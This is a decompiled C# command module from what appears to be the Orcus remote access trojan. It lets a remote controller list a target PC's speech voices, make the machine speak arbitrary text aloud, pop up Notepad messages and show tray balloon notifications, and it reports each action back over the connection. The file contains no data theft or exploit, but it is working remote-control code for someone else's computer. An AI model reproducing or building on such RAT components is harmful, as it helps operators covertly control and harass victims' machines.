using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Orcus.Plugins;
using Orcus.Shared.Commands.UserInteraction;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.UserInteraction;

internal class UserInteractionCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Invalid comparison between Unknown and I4
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Invalid comparison between Unknown and I4
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Invalid comparison between Unknown and I4
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		UserInteractionCommunication val = (UserInteractionCommunication)parameter[0];
		if ((int)val <= 2)
		{
			if ((int)val == 0)
			{
				UserInteractionWelcomePackage val2 = new UserInteractionWelcomePackage();
				SpeechSynthesizer val3 = new SpeechSynthesizer();
				try
				{
					val2.set_Voices(((IEnumerable<InstalledVoice>)val3.GetInstalledVoices()).Select((Func<InstalledVoice, SpeechVoice>)delegate(InstalledVoice x)
					{
						//IL_0000: Unknown result type (might be due to invalid IL or missing references)
						//IL_0005: Unknown result type (might be due to invalid IL or missing references)
						//IL_001b: Unknown result type (might be due to invalid IL or missing references)
						//IL_002c: Unknown result type (might be due to invalid IL or missing references)
						//IL_0033: Unknown result type (might be due to invalid IL or missing references)
						//IL_003e: Unknown result type (might be due to invalid IL or missing references)
						//IL_0045: Unknown result type (might be due to invalid IL or missing references)
						//IL_0050: Expected O, but got Unknown
						SpeechVoice val8 = new SpeechVoice();
						val8.set_Culture(x.get_VoiceInfo().get_Culture().TwoLetterISOLanguageName);
						val8.set_Name(x.get_VoiceInfo().get_Name());
						val8.set_VoiceAge((SpeechAge)(byte)x.get_VoiceInfo().get_Age());
						val8.set_VoiceGender((SpeechGender)x.get_VoiceInfo().get_Gender());
						return val8;
					}).ToList());
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
				List<byte> list = new List<byte> { 1 };
				list.AddRange(new Serializer(typeof(UserInteractionWelcomePackage)).Serialize((object)val2));
				connectionInfo.CommandResponse((Command)(object)this, list.ToArray(), (PackageCompression)0);
				return;
			}
			if ((int)val == 2)
			{
				TextToSpeechPackage val4 = new Serializer(typeof(TextToSpeechPackage)).Deserialize<TextToSpeechPackage>(parameter, 1);
				SpeechSynthesizer val5 = new SpeechSynthesizer();
				try
				{
					val5.set_Rate((int)val4.get_Speed());
					val5.set_Volume(val4.get_Volume());
					val5.SelectVoice(val4.get_VoiceName());
					val5.SetOutputToDefaultAudioDevice();
					connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 3 }, (PackageCompression)0);
					val5.Speak(val4.get_Text());
					connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 4 }, (PackageCompression)0);
					return;
				}
				finally
				{
					((IDisposable)val5)?.Dispose();
				}
			}
		}
		else
		{
			if ((int)val == 5)
			{
				int num = BitConverter.ToInt32(parameter, 1);
				NotepadHelper.ShowMessage(Encoding.UTF8.GetString(parameter, 5, num), Encoding.UTF8.GetString(parameter, num + 5, parameter.Length - (5 + num)));
				connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 6 }, (PackageCompression)0);
				return;
			}
			if ((int)val == 7)
			{
				int num2 = BitConverter.ToInt32(parameter, 2);
				int num3 = BitConverter.ToInt32(parameter, 6);
				string @string = Encoding.UTF8.GetString(parameter, 10, num3);
				string string2 = Encoding.UTF8.GetString(parameter, 10 + num3, parameter.Length - (10 + num3));
				NotifyIcon val6 = new NotifyIcon();
				val6.set_Icon(SystemIcons.get_Application());
				NotifyIcon val7 = val6;
				try
				{
					val7.set_Visible(true);
					val7.ShowBalloonTip(num2, @string, string2, (ToolTipIcon)parameter[1]);
					connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 8 }, (PackageCompression)0);
					Thread.Sleep(num2);
					return;
				}
				finally
				{
					((IDisposable)val7)?.Dispose();
				}
			}
		}
		throw new ArgumentOutOfRangeException();
	}

	protected override uint GetId()
	{
		return 22u;
	}
}
